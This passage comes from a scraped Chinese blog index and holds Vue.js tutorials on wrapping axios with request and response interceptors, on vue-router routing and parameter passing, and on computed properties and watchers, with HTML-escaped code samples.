否则跳转到h5登录并带上跳转路由 const search = encodeSearchParams(&#123; next: location.href, &#125;) location.replace(`/user/login`) &#125; // 不显示提示消息 data.description = '' break default: &#125; // 若不是正确的返回code，且已经登录，就抛出错误 const err = new Error(data.description) err.data = data err.response = response // 第二种方式，仅对200和error状态处理 if (data.status &amp;&amp; data.status == 200 &amp;&amp; data.data.status == 'error') &#123; Message.error(&#123;message: data.data.msg&#125;); return; &#125; return data;&#125;, err=&gt; &#123;//============== 错误处理 ==================== if (err &amp;&amp; err.response) &#123; switch (err.response.status) &#123; case 400: err.message = '请求错误(400)'; break; case 401: err.message = '未授权，请重新登录(401)'; break; case 403: err.message = '拒绝访问(403)'; break; case 404: err.message = '请求出错(404)'; break; case 408: err.message = '请求超时(408)'; break; case 500: err.message = '服务器错误(500)'; break; case 501: err.message = '服务未实现(501)'; break; case 502: err.message = '网络错误(502)'; break; case 503: err.message = '服务不可用(503)'; break; case 504: err.message = '网络超时(504)'; break; case 505: err.message = 'HTTP版本不受支持(505)'; break; default: err.message = `连接出错($&#123;err.response.status&#125;)!`; &#125; &#125; else &#123; err.message = '连接服务器失败!' &#125; Message.err( &#123;message: err.message &#125; ) return Promise.resolve(err);&#125;) 请求出错的时候执行的是：Promise.resolve(err);，而不是Promise.reject(err);，这样无论请求成功还是失败，在成功的回调中都能收到通知 8.3 vue 项目中使用该方法 在main.js中导入所有请求方法 12// 导入所有请求方法import &#123;getRequest,postRequest,deleteRequest,putRequest&#125; from './utils/api' 将请求方法添加至 Vue.prototype 上 12345// 向VUE的原型上添加请求方法Vue.prototype.getRequest = getRequest;Vue.prototype.postRequest = postRequest;Vue.prototype.deleteRequest = deleteRequest;Vue.prototype.putRequest = putRequest; 发送请求（请求方法的调用） 12345// 发送网络请求this.postRequest('/login', &#123;userName，password&#125;).then(resp=&gt; &#123; ... &#125;&#125;); 九、接口封装处理 vue中Axios的封装与API接口的管理详解 9.1 axios的封装 在vue项目中，和后台交互获取数据这块，我们通常使用的是axios库，它是基于promise的http库，可运行在浏览器端和node.js中。他有很多优秀的特性，例如拦截请求和响应、取消请求、转换json、客户端防御XSRF等 一般我会在项目的src目录中，新建一个request文件夹，然后在里面新建一个http.js和一个api.js文件。http.js文件用来封装我们的axios，api.js用来统一管理我们的接口 12345// 在http.js中引入axiosimport axios from 'axios'; // 引入axiosimport QS from 'qs'; // 引入qs模块，用来序列化post类型的数据，后面会提到// vant的toast提示框组件，大家可根据自己的ui组件更改。import &#123; Toast &#125; from 'vant'; 9.2 环境的切换 我们的项目环境可能有开发环境、测试环境和生产环境。我们通过node的环境变量来匹配我们的默认的接口url前缀。axios.defaults.baseURL可以设置axios的默认请求地址就不多说了 123456789// 环境的切换if (process.env.NODE_ENV == 'development') &#123; axios.defaults.baseURL = 'https://www.baidu.com';&#125; else if (process.env.NODE_ENV == 'debug') &#123; axios.defaults.baseURL = 'https://www.ceshi.com';&#125; else if (process.env.NODE_ENV == 'production') &#123; axios.defaults.baseURL = 'https://www.production.com';&#125; 9.3 设置请求超时 通过axios.defaults.timeout设置默认的请求超时时间。例如超过了10s，就会告知用户当前请求超时，请刷新等 1axios.defaults.timeout = 10000; post请求头的设置post请求的时候，我们需要加上一个请求头，所以可以在这里进行一个默认的设置，即设置post的请求头为application/x-www-form-urlencoded;charset=UTF-8 1axios.defaults.headers.post[&apos;Content-Type&apos;] = &apos;application/x-www-form-urlencode 9.4 请求拦截 我们在发送请求前可以进行一个请求的拦截，为什么要拦截呢，我们拦截请求是用来做什么的呢？比如，有些请求是需要用户登录之后才能访问的，或者post请求的时候，我们需要序列化我们提交的数据。这时候，我们可以在请求被发送之前进行一个拦截，从而进行我们想要的操作 12345678910111213141516// 先导入vuex,因为我们要使用到里面的状态对象// vuex的路径根据自己的路径去写import store from '@/store/index';// 请求拦截器axios.interceptors.request.use( config =&gt; &#123; // 每次发送请求之前判断vuex中是否存在token // 如果存在，则统一在http请求的header都加上token，这样后台根据token判断你的登录情况 // 即使本地存在token，也有可能token是过期的，所以在响应拦截器中要对返回状态进行判断 const token = store.state.token; token &amp;&amp; (config.headers.Authorization = token); return config; &#125;, error =&gt; &#123; return Promise.error(error); &#125;) 一般是在登录完成之后，将用户的token通过localStorage或者cookie存在本地，然后用户每次在进入页面的时候（即在main.js中），会首先从本地存储中读取token，如果token存在说明用户已经登陆过，则更新vuex中的token状态。然后，在每次请求接口的时候，都会在请求的header中携带token，后台人员就可以根据你携带的token来判断你的登录是否过期，如果没有携带，则说明没有登录过。这时候或许有些小伙伴会有疑问了，就是每个请求都携带token，那么要是一个页面不需要用户登录就可以访问的怎么办呢？其实，你前端的请求可以携带token，但是后台可以选择不接收啊！ 9.5 响应的拦截1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374// 响应拦截器axios.interceptors.response.use( response =&gt; &#123; // 如果返回的状态码为200，说明接口请求成功，可以正常拿到数据 // 否则的话抛出错误 if (response.status === 200) &#123; return Promise.resolve(response); &#125; else &#123; return Promise.reject(response); &#125; &#125;, // 服务器状态码不是2开头的的情况 // 这里可以跟你们的后台开发人员协商好统一的错误状态码 // 然后根据返回的状态码进行一些操作，例如登录过期提示，错误提示等等 // 下面列举几个常见的操作，其他需求可自行扩展 error =&gt; &#123; if (error.response.status) &#123; switch (error.response.status) &#123; // 401: 未登录 // 未登录则跳转登录页面，并携带当前页面的路径 // 在登录成功后返回当前页面，这一步需要在登录页操作。 case 401: router.replace(&#123; path: '/login', query: &#123; redirect: router.currentRoute.fullPath &#125; &#125;); break; // 403 token过期 // 登录过期对用户进行提示 // 清除本地token和清空vuex中token对象 // 跳转登录页面 case 403: Toast(&#123; message: '登录过期，请重新登录', duration: 1000, forbidClick: true &#125;); // 清除token localStorage.removeItem('token'); store.commit('loginSuccess', null); // 跳转登录页面，并将要浏览的页面fullPath传过去，登录成功后跳转需要访问的页面 setTimeout(() =&gt; &#123; router.replace(&#123; path: '/login', query: &#123; redirect: router.currentRoute.fullPath &#125; &#125;); &#125;, 1000); break; // 404请求不存在 case 404: Toast(&#123; message: '网络请求不存在', duration: 1500, forbidClick: true &#125;); break; // 其他错误，直接抛出错误提示 default: Toast(&#123; message: error.response.data.message, duration: 1500, forbidClick: true &#125;); &#125; return Promise.reject(error.response); &#125; &#125; &#125;); 响应拦截器很好理解，就是服务器返回给我们的数据，我们在拿到之前可以对他进行一些处理。例如上面的思想：如果后台返回的状态码是200，则正常返回数据，否则的根据错误的状态码类型进行一些我们需要的错误，其实这里主要就是进行了错误的统一处理和没登录或登录过期后调整登录页的一个操作 要注意的是，上面的Toast()方法，是我引入的vant库中的toast轻提示组件，你根据你的ui库，对应使用你的一个提示组件 9.6 封装get方法和post方法 我们常用的ajax请求方法有get、post、put等方法。axios对应的也有很多类似的方法，不清楚的可以看下文档。但是为了简化我们的代码，我们还是要对其进行一个简单的封装。下面我们主要封装两个方法：get和post get方法：我们通过定义一个get函数，get函数有两个参数，第一个参数表示我们要请求的url地址，第二个参数是我们要携带的请求参数。get函数返回一个promise对象，当axios其请求成功时resolve服务器返回值，请求失败时reject错误值。最后通过export抛出get函数 123456789101112131415/** * get方法，对应get请求 * @param &#123;String&#125; url [请求的url地址] * @param &#123;Object&#125; params [请求时携带的参数] */export function get(url, params)&#123; return new Promise((resolve, reject) =&gt;&#123; axios.get(url, &#123; params: params &#125;).then(res =&gt; &#123; resolve(res.data); &#125;).catch(err =&gt;&#123; reject(err.data) &#125;) &#125;);&#125; post方法：原理同get基本一样，但是要注意的是，post方法必须要使用对提交从参数对象进行序列化的操作，所以这里我们通过node的qs模块来序列化我们的参数。这个很重要，如果没有序列化操作，后台是拿不到你提交的数据的 12345678910111213141516/** * post方法，对应post请求 * @param &#123;String&#125; url [请求的url地址] * @param &#123;Object&#125; params [请求时携带的参数] */export function post(url, params) &#123; return new Promise((resolve, reject) =&gt; &#123; axios.post(url, QS.stringify(params)) .then(res =&gt; &#123; resolve(res.data); &#125;) .catch(err =&gt;&#123; reject(err.data) &#125;) &#125;);&#125; axios.get()方法和axios.post()在提交数据时参数的书写方式还是有区别的。区别就是，get的第二个参数是一个{}，然后这个对象的params属性值是一个参数对象的。而post的第二个参数就是一个参数对象 9.7 api的统一管理 首先我们在api.js中引入我们封装的get和post方法 1234/** * api接口统一管理 */import &#123; get, post &#125; from './http' 在api.js中 1export const apiAddress = param =&gt; post(&apos;api/v1/users&apos;,param) 在我们的页面中可以这样调用我们的api接口 1234567891011121314151617181920import &#123; apiAddress &#125; from '@/request/api';// 导入我们的api接口export default &#123; name: 'Address', created () &#123; this.onLoad(); &#125;, methods: &#123; // 获取数据 onLoad() &#123; // 调用api接口，并且提供了两个参数 apiAddress(&#123; type: 0, sort: 1 &#125;).then(res =&gt; &#123; // 获取数据成功后的其他操作 ……………… &#125;) &#125; &#125;&#125; 9.8 完整封装代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138/**axios封装 * 请求拦截、相应拦截、错误统一处理 */import axios from 'axios';import QS from 'qs';import &#123; Toast&#125;from 'vant';import store from '../store/index'// 环境的切换if (process.env.NODE_ENV == 'development') &#123; axios.defaults.baseURL = '/api';&#125; else if (process.env.NODE_ENV == 'debug') &#123; axios.defaults.baseURL = '';&#125; else if (process.env.NODE_ENV == 'production') &#123; axios.defaults.baseURL = 'http://api.123dailu.com/';&#125;// 请求超时时间axios.defaults.timeout = 10000;// post请求头axios.defaults.headers.post['Content-Type'] = 'application/x-www-form-urlencoded;charset=UTF-8';// 请求拦截器axios.interceptors.request.use(config = &gt; &#123; // 每次发送请求之前判断是否存在token，如果存在，则统一在http请求的header都加上token，不用每次请求都手动添加了 // 即使本地存在token，也有可能token是过期的，所以在响应拦截器中要对返回状态进行判断 const token = store.state.token; token &amp;&amp; (config.headers.Authorization = token); return config;&#125;, error = &gt; &#123; return Promise.error(error);&#125;)// 响应拦截器axios.interceptors.response.use(response = &gt; &#123; if (response.status === 200) &#123; return Promise.resolve(response); &#125; else &#123; return Promise.reject(response); &#125;&#125;,// 服务器状态码不是200的情况 error = &gt; &#123; if (error.response.status) &#123; switch (error.response.status) &#123; // 401: 未登录 // 未登录则跳转登录页面，并携带当前页面的路径 // 在登录成功后返回当前页面，这一步需要在登录页操作。 case 401: router.replace(&#123; path: '/login', query: &#123; redirect: router.currentRoute.fullPath &#125; &#125;); break; // 403 token过期 // 登录过期对用户进行提示 // 清除本地token和清空vuex中token对象 // 跳转登录页面 case 403: Toast(&#123; message: '登录过期，请重新登录', duration: 1000, forbidClick: true &#125;); // 清除token localStorage.removeItem('token'); store.commit('loginSuccess', null); // 跳转登录页面，并将要浏览的页面fullPath传过去，登录成功后跳转需要访问的页面 setTimeout(() = &gt; &#123; router.replace(&#123; path: '/login', query: &#123; redirect: router.currentRoute.fullPath &#125; &#125;); &#125;, 1000); break; // 404请求不存在 case 404: Toast(&#123; message: '网络请求不存在', duration: 1500, forbidClick: true &#125;); break; // 其他错误，直接抛出错误提示 default: Toast(&#123; message: error.response.data.message, duration: 1500, forbidClick: true &#125;); &#125; return Promise.reject(error.response); &#125;&#125;);/** * get方法，对应get请求 * @param &#123;String&#125; url [请求的url地址] * @param &#123;Object&#125; params [请求时携带的参数] */exportfunction get(url, params) &#123; return new Promise((resolve, reject) = &gt; &#123; axios.get(url, &#123; params: params &#125;).then(res = &gt; &#123; resolve(res.data); &#125;). catch (err = &gt; &#123; reject(err.data) &#125;) &#125;);&#125;/** * post方法，对应post请求 * @param &#123;String&#125; url [请求的url地址] * @param &#123;Object&#125; params [请求时携带的参数] */exportfunction post(url, params) &#123; return new Promise((resolve, reject) = &gt; &#123; axios.post(url, QS.stringify(params)).then(res = &gt; &#123; resolve(res.data); &#125;). catch (err = &gt; &#123; reject(err.data) &#125;) &#125;);&#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://ru23.com/tags/Vue/"}]},{"title":"vue路由（十一）","slug":"2018-03-vue-router","date":"2018-08-28T07:30:32.000Z","updated":"2018-10-24T03:46:02.478Z","comments":true,"path":"note/35f2d11f.html","link":"","permalink":"https://ru23.com/note/35f2d11f.html","excerpt":"","text":"一、路由基础介绍1.1 什么是前端路由 路由是根据不同的url地址展示不同的内容或页面 前端路由就是把不同的路由对应不同的内容或页面的任务交给前端来做，之前是通过服务端根据url的不同返回不同的页面实现的 1.2 什么时候使用前端路由 在单页面应用，大部分结构不变，只改变内容的使用 1.3 前端路由优点、缺点 优点： 用户体验好，不需要每次都从服务器全部获取，快速展现给用户 缺点： 不利于SEO 使用浏览器的前进，后退键的时候会重新发送请求，没有合理的利用缓存 单页面无法记住之前滚动的位置，无法再前进，后退的时候记住滚动的位置 二、vue-router用来构建SPA2.1 开始 在你的文件夹下的 src 文件夹下的 main.js 文件内写入以下代码 1234import Vue from 'vue'import VueRouter from 'vue-router'Vue.use(VueRouter) vue-router其实就是对history的封装 地址后面跟#其实就是用了hash 1234567891011121314&lt;div id=\"box\"&gt; &lt;/div&gt;&lt;!--定义模版--&gt;&lt;template id=\"a\"&gt; &lt;div&gt; 第一个router &lt;/div&gt;&lt;/template&gt;&lt;template id=\"b\"&gt; &lt;div&gt; 第二个router &lt;/div&gt;&lt;/template&gt; 123456789101112131415161718192021var routes = [ &#123; path:\"/one\", component:&#123;template:\"#a\"&#125; &#125;, &#123; path:\"/two\", component:&#123;template:\"#b\"&#125; &#125;,];// 定义路由组件var router = new VueRouter(&#123; routes&#125;);// 定义路由new Vue(&#123; el:\"#box\", router&#125;);// 创建和挂载实例 12345&lt;div id=\"box\"&gt; &lt;router-link to=\"/one\"&gt;One&lt;/router-link&gt; &lt;router-link to=\"/two\"&gt;Two&lt;/router-link&gt; &lt;router-view&gt;&lt;/router-view&gt;&lt;/div&gt; &lt; router-link &gt; 默认会被渲染成一个 &lt;a&gt; 标签 to=&quot;&quot;为我们定义的路由 &lt; router-view &gt; 路由匹配到的组件将渲染在这里 在new Router中指定mode为history即可去掉#，这样加载更加逼真符合预期 1234new Router(&#123; mode: \"history\", routes: []&#125;) 12345678//router-link跳转标签 当a标签使用，to必须是一个绝对地址&lt;router-link to=\"/goods/title\"&gt;&lt;/router-link&gt;//或者this.$router.push(&#123;path:\"\"&#125;)// 组件的渲染 配合router—link使用&lt;router-view&gt;&lt;/router-view&gt; 2.2 动态路由匹配 通过变化的地址去加载信息 模式 匹配路径 $route.params /user/:username /user/poetries {username:&quot;poetries&quot;} /user/:username/post/:post_id /user/poetries/post/123 {username:&quot;evan&quot;,post_id:123} 应用场景 商城的详情页，要变换商品的id，根据商品的id去查对应商品的信息 2.3 嵌套路由 什么是嵌套路由 路由嵌套路由 1234567891011121314151617new Router(&#123; mode: \"history\", routes: [ &#123; path:\"/goods\", name: \"GoodsList\", component:GoodsList, children: [ // 定义子组件 &#123; path:\"title\",//最后形式/goods/title name:\"title\", component:Title &#125; ] &#125; ]&#125;) 2.4 编程式路由 通过js来实现页面的跳转 通过push名字就可以实现页面的跳转 1234567891011121314// 方式一this.$router.push(\"name\") //name /cart// 方式二 this.$router.push(&#123;path:\"name\"&#125;)// 方式三 传递参数this.$router.push(&#123;path:\"name?a=123\"&#125;)// 或者this.$router.push(&#123;path:\"name\",query:&#123;a:123&#125;&#125;)// 方式四 this.$router.go(1) //$router其实就是对history的封装 如何拿到传递过来的参数 1this.$router.push(\"/cart?goodsId=123\") 123&lt;!--如何在页面上拿到goodsId--&gt;&lt;span&gt;&#123;&#123;$.route.query.goodsId&#125;&#125;&lt;/span&gt; $route.params是组件跟组件之间路由切换的时候，参数传递 2.5 命名路由 有时我们通过一个名称来标识一个路由显得更方便一些，特别是在链接一个路由，或者是执行一些跳转的时候。你可以在创建 Router 实例的时候，在 routes 配置中给某个路由设置名称 给路由定义不同的名字，根据名字进行匹配 给不同的router-view定义名字，通过名字进行对应组件渲染 12345678910new Router(&#123; mode: \"history\", routes: [ &#123; path:\"/cart/:cartId\", name: \"cart\", component:GoodsList, &#125; ]&#125;) 之前的跳转方式 1&lt;router-link to=\"/cart\"&gt;&lt;/router-link&gt; 根据路由名字跳转。以下是一个命名的路由，而且还带了参数 12&lt;router-link v-bind:to=\"&#123;&#123;name:'cart',params:&#123;cartId:123&#125;&#125;&#125;\"&gt;&lt;/router-link&gt;&lt;!--params是路由的参数，并不是页面之间跳转的参数--&gt; 2.6 命名视图 有时候想同时（同级）展示多个视图，而不是嵌套展示，例如创建一个布局，有 ·sidebar·（侧导航） 和main（主内容） 两个视图，这个时候命名视图就派上用场了。你可以在界面中拥有多个单独命名的视图，而不是只有一个单独的出口。如果 router-view 没有设置名字，那么默认为 default 实现一个命名的视图（很少用到） 给router-view加name值 12345&lt;router-view&gt;&lt;/router-view&gt;&lt;router-view name=\"title\"&gt;&lt;/router-view&gt;&lt;router-view name=\"image\"&gt;&lt;/router-view&gt; 页面一进来就加载三个router-view。实现方法 123456789101112131415161718new Router(&#123; mode: \"history\", routes: [ &#123; path:\"/\", name: \"cart\", // 根据不同的name值去加载对应的router-view,映射到对应的组件 components:&#123; default:GoodsList, title:Title, img:Image &#125;, path:\"/cart/:cartId\", name: \"cart\", component:Cart &#125; ]&#125;) 12&lt;router-view&gt;&lt;/router-view&gt;&lt;router-view&gt;&lt;/router-view&gt; 当我们的视图如上时,我们会发现每一个路由被渲染了两次,所以我们需要为视图命名 1234567891011121314151617&lt;router-view name=\"a\"&gt;&lt;/router-view&gt;&lt;router-view name=\"b\"&gt;&lt;/router-view&gt;``` ```javascriptvar Foo = &#123; template: '&lt;div&gt;foo&lt;/div&gt;' &#125;var Bar = &#123; template: '&lt;div&gt;bar&lt;/div&gt;' &#125;var routes = [ &#123; path:\"/one\", name:\"one\", components:&#123; a:Foo, b:Bar &#125; &#125;, ] 2.7 重定向和别名重定向 重定向(Redirect)就是通过各种方法将各种网络请求重新定个方向转到其它位置,用于网站调整或网页被移到一个新地址,它也是通过 routes 配置来完成，下面例子是从 /a 重定向到 /b 12345var router = new VueRouter(&#123; routes: [ &#123; path: '/a', redirect: '/b' &#125; ]&#125;) 别名 /a 的别名是 /b，意味着，当用户访问/b 时，URL 会保持为 /b，但是路由匹配则为 /a，就像用户访问/a 一样。简单的说就是给 /a 起了一个外号叫做 /b ,但是本质上还是 /a 12345var router = new VueRouter(&#123; routes: [ &#123; path: '/a', component: A, alias: '/b' &#125; ]&#125;) 2.8 列表进入详情页传参 例如商品列表页面前往商品详情页面，需要传一个商品id 1&lt;router-link :to=\"&#123;path: 'detail', query: &#123;id: 1&#125;&#125;\"&gt;前往detail页面&lt;/router-link&gt; c页面的路径为http://localhost:8080/#/detail?id=1，可以看到传了一个参数id=1，并且就算刷新页面id也还会存在。此时在c页面可以通过id来获取对应的详情数据，获取id的方式是this.$route.query.id vue传参方式有：query、params+动态路由传参 query通过path切换路由，params通过name切换路由 1234// query通过path切换路由&lt;router-link :to=\"&#123;path: 'Detail', query: &#123; id: 1 &#125;&#125;\"&gt;前往Detail页面&lt;/router-link&gt;// params通过name切换路由&lt;router-link :to=\"&#123;name: 'Detail', params: &#123; id: 1 &#125;&#125;\"&gt;前往Detail页面&lt;/router-link&gt; query通过this.$route.query来接收参数，params通过this.$route.params来接收参数 123456789// query通过this.$route.query接收参数created () &#123; const id = this.$route.query.id;&#125;// params通过this.$route.params来接收参数created () &#123; const id = this.$route.params.id;&#125; query传参的url展现方式：/detail?id=1&amp;user=123&amp;identity=1&amp;更多参数 params＋动态路由的url方式：/detail/123 params动态路由传参，一定要在路由中定义参数，然后在路由跳转的时候必须要加上参数，否则就是空白页面 12345&#123; path: &apos;/detail/:id&apos;, name: &apos;Detail&apos;, component: Detail &#125;, 注意，params传参时，如果没有在路由中定义参数，也是可以传过去的，同时也能接收到，但是一旦刷新页面，这个参数就不存在了。这对于需要依赖参数进行某些操作的行为是行不通的 12345678910111213141516171819// 定义的路由中，只定义一个id参数&#123; path: 'detail/:id', name: 'Detail', components: Detail&#125;// template中的路由传参，// 传了一个id参数和一个token参数// id是在路由中已经定义的参数，而token没有定义&lt;router-link :to=\"&#123;name: 'Detail', params: &#123; id: 1, token: '123456' &#125;&#125;\"&gt;前往Detail页面&lt;/router-link&gt;// 在详情页接收created () &#123; // 以下都可以正常获取到 // 但是页面刷新后，id依然可以获取，而token此时就不存在了 const id = this.$route.params.id; const token = this.$route.params.token;&#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://ru23.com/tags/Vue/"}]},{"title":"vue计算属性与数据监听（十）","slug":"2018-03-vue-computed-watch","date":"2018-08-28T06:10:42.000Z","updated":"2018-10-24T03:46:02.429Z","comments":true,"path":"note/fdf99685.html","link":"","permalink":"https://ru23.com/note/fdf99685.html","excerpt":"","text":"一、监听属性 我们在工作中常常需要监听某一个属性值的变化，这个时候我们就需要用到了监听属性watch 1.1 基础版监听 场景如下：输入框输入你的年龄，如果年龄在0-15岁提示信息：你还是个小孩，如果年龄在 15-25岁，提示信息：你已经是个少年，如果年龄在25岁以上，提示信息：你已经长大了 12345678910111213141516171819202122232425262728&lt;template&gt; &lt;div id=\"app\"&gt; 年齡：&lt;input type=\"number\" v-model=\"age\"&gt;&lt;br&gt; 提示信息：&lt;span&gt;&#123;&#123;infoMsg&#125;&#125;&lt;/span&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; age: \"\", infoMsg:\"\" &#125; &#125;, watch:&#123; age:function(val,oldval)&#123; if(val&gt;0 &amp;&amp; val&lt;15)&#123; this.infoMsg=\"你还是个小孩\" &#125;else if(val&gt;15 &amp;&amp; val&lt;25)&#123; this.infoMsg=\"你已经是个少年\" &#125;else&#123; this.infoMsg=\"你已经长大了\" &#125; &#125; &#125;&#125;&lt;/script&gt; 1.2 进阶版监听 下面我们改变一下需求：基础规则不变，但是因为后台数据库的更改,我们需要提交一个这样的数据结构 12345678data() &#123; return &#123; info: &#123; age: \"\" &#125;, infoMsg: \"\" &#125;; &#125; 由于我们监听的是对象info中的属性age值的变化，所以我们需要使用到的是深度监听，具体代码如下 12345678910111213141516171819202122232425262728293031323334&lt;template&gt; &lt;div id=\"app\"&gt; 年齡：&lt;input type=\"number\" v-model=\"info.age\"&gt;&lt;br&gt; 提示信息：&lt;span&gt;&#123;&#123;infoMsg&#125;&#125;&lt;/span&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; info: &#123; age: \"\" &#125;, infoMsg: \"\" &#125;; &#125;, watch: &#123; info: &#123; handler: function(val, oldval) &#123; var that = this; if (val.age &gt; 0 &amp;&amp; val.age &lt; 15) &#123; that.infoMsg = \"你还是个小孩\"; &#125; else if (val.age &gt; 15 &amp;&amp; val.age &lt; 25) &#123; that.infoMsg = \"你已经是个少年\"; &#125; else &#123; that.infoMsg = \"你已经长大了\"; &#125; &#125;, deep: true &#125; &#125;&#125;;&lt;/script&gt; 这里的function不能使用箭头函数替代，如果使用箭头函数的话，this的指向会是全局 你会注意到这里多加入一个属性是deep，它的含义表示是否开启深度监听，如果开启值为true，反之为false 1.3 高级版监听12345678910111213141516171819202122232425262728293031323334353637383940&lt;template&gt; &lt;div id=\"app\"&gt; 年齡：&lt;input type=\"number\" v-model=\"info.age\"&gt;&lt;br&gt; 提示信息：&lt;span&gt;&#123;&#123;infoMsg&#125;&#125;&lt;/span&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; info: &#123; age: \"\", name: \"\", hobit: \"\" &#125;, infoMsg: \"\" &#125;; &#125;, computed: &#123; ageval: function() &#123; return this.info.age; &#125; &#125;, watch: &#123; ageval: &#123; handler: function(val, oldval) &#123; var that = this; if (val &gt; 0 &amp;&amp; val &lt; 15) &#123; that.infoMsg = \"你还是个小孩\"; &#125; else if (val &gt; 15 &amp;&amp; val &lt; 25) &#123; that.infoMsg = \"你已经是个少年\"; &#125; else &#123; that.infoMsg = \"你已经长大了\"; &#125; &#125;, deep: true &#125; &#125;&#125;;&lt;/script&gt; 这次我们监听的是计算属性ageval，而计算属性返回的则是info对象中age的值，与第二次的代码进行比较我们可以发现两次代码中监听的一个是对象info，一个是info对象中age的值 二、计算属性2.1 什么是计算属性 模板内的表达式非常便利，但是设计它们的初衷是用于简单运算的。在模板中放入太多的逻辑会让模板过重且难以维护。例如 123&lt;div id=\"example\"&gt; &#123;&#123; message.split('').reverse().join('') &#125;&#125;&lt;/div&gt; 遇到复杂逻辑时应该使用Vue特带的计算属性computed来进行处理 2.2 计算属性的用法 在一个计算属性里可以完成各种复杂的逻辑，包括运算、函数调用等，只要最终返回一个结果就可以 1234&lt;div id=\"example\"&gt; &lt;p&gt;Original message: \"&#123;&#123; message &#125;&#125;\"&lt;/p&gt; &lt;p&gt;Computed reversed message: \"&#123;&#123; reversedMessage &#125;&#125;\"&lt;/p&gt; &lt;!--我们把复杂处理放在了计算属性里面了--&gt;&lt;/div&gt; 123456789101112var vm = new Vue(&#123; el: '#example', data: &#123; message: 'Hello' &#125;, computed: &#123; reversedMessage: function () &#123; // `this` 指向 vm 实例 return this.message.split('').reverse().join('') &#125; &#125;&#125;); 计算属性还可以依赖多个Vue 实例的数据，只要其中任一数据变化，计算属性就会重新执行，视图也会更新 1234&lt;div id=\"app\"&gt; &lt;button @click=\"add()\"&gt;补充货物1&lt;/button&gt; &lt;div&gt;总价为：&#123;&#123;price&#125;&#125;&lt;/div&gt;&lt;/div&gt; 1234567891011121314151617181920212223var app = new Vue(&#123; el: '#app', data: &#123; package1: &#123; count: 5, price: 5 &#125;, package2: &#123; count: 10, price: 10 &#125; &#125;, computed: &#123; price: function()&#123; return this.package1.count*this.package1.price+this.package2.count*this.package2.price //总价随着货物或价格的改变会重新计算 &#125; &#125;, methods: &#123; //对象的方法 add: function()&#123; this.package1.count++ &#125; &#125;&#125;); 每一个计算属性都包含一个getter 和一个setter ，我们上面的两个示例都是计算属性的默认用法， 只是利用了getter 来读取 在你需要时，也可以提供一个setter 函数， 当手动修改计算属性的值就像修改一个普通数据那样时，就会触发setter 函数，执行一些自定义的操作，例如 12345678910111213141516171819202122var vm = new Vue(&#123; el: '#demo', data: &#123; firstName: 'Foo', lastName: 'Bar' &#125;, computed: &#123; fullName: &#123; // getter get: function () &#123; return this.firstName + ' ' + this.lastName &#125;, // setter set: function (newValue) &#123; var names = newValue.split(' '); this.firstName = names[0]; this.lastName = names[names.length - 1]; &#125; &#125; &#125;&#125;);//现在再运行 vm.fullName = 'John Doe' 时，setter 会被调用，vm.firstName 和 vm.lastName 也会相应地被更新。 绝大多数情况下，我们只会用默认的getter 方法来读取一个计算属性，在业务中很少用到setter,所以在声明一个计算属性时，可以直接使用默认的写法，不必将getter 和setter都声明 2.3 计算属性缓存 除了使用计算属性外，我们也可以通过在表达式中调用方法来达到同样的效果 1&lt;div&gt;&#123;&#123;reverseTitle()&#125;&#125;&lt;/div&gt; 123456// 在组件中methods: &#123; reverseTitle: function () &#123; return this.title.split('').reverse().join('') &#125;&#125; 我们可以将同一函数定义为一个方法而不是一个计算属性，两种方式的最终结果确实是完全相同的。只是一个使用reverseTitle()取值，一个使用reverseTitle取值。 然而，不同的是计算属性是基于它们的依赖进行缓存的。计算属性只有在它的相关依赖发生改变时才会重新求值。 这就意味着只要 title还没有发生改变，多次访问reverseTitle计算属性会立即返回之前的计算结果，而不必再次执行函数。 12345678910111213141516171819202122&lt;div&gt;&#123;&#123;reverseTitle&#125;&#125;&lt;/div&gt;&lt;div&gt;&#123;&#123;reverseTitle1()&#125;&#125;&lt;/div&gt;&lt;button @click=\"add()\"&gt;补充货物1&lt;/button&gt;&lt;div&gt;总价为：&#123;&#123;price&#125;&#125;&lt;/div&gt;&lt;script&gt; computed: &#123; reverseTitle: function()&#123; return this.title.split('').reverse().join('') //而使用计算属性，只要title没变，页面渲染是不会重新进这里来计算的，而是使用了缓存。 &#125;, price: function()&#123; return this.package1.count*this.package1.price+this.package2.count*this.package2.price &#125; &#125;, methods: &#123; //对象的方法 add: function()&#123; this.package1.count++ &#125;, reverseTitle1: function()&#123; return this.title.split('').reverse().join('') //点击补充货物，也会进这个方法，再次计算。不是刷新，而是只要页面渲染，就会进方法里重新计算。 &#125;&lt;/script&gt; 相比之下，每当触发重新渲染时，调用方法将总会再次执行函数。 我们为什么需要缓存？假设我们有一个性能开销比较大的的计算属性 A，它需要遍历一个巨大的数组并做大量的计算。然后我们可能有其他的计算属性依赖于 A 如果没有缓存，我们将不可避免的多次执行 A 的getter！如果你不希望有缓存，请用方法来替代","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://ru23.com/tags/Vue/"}]},{"title":"vue组件（九)","slug":"2018-03-vue-component","date":"2018-08-27T03:20:32.000Z","updated":"2018-10-24T03:46:02.427Z","comments":true,"path":"note/a45ffb2e.html","link":"","permalink":"https://ru23.com/note/a45ffb2e.html","excerpt":"","text":"一、组件的基本使用1.1 注册组件 注册组件就是利用Vue.component()方法，先传入一个自定义组件的名字，然后传入这个组件的配置 12345678Vue.component('mycomponent',&#123; template: `&lt;div&gt;这是一个自定义组件&lt;/div&gt;`, data () &#123; return &#123; message: 'hello world' &#125; &#125; &#125;) 如上方式，就已经创建了一个自定义组件，然后就可以在Vue实例挂在的DOM元素中使用它 12345678910111213141516&lt;div id=\"app\"&gt; &lt;mycomponent&gt;&lt;/mycomponent&gt; 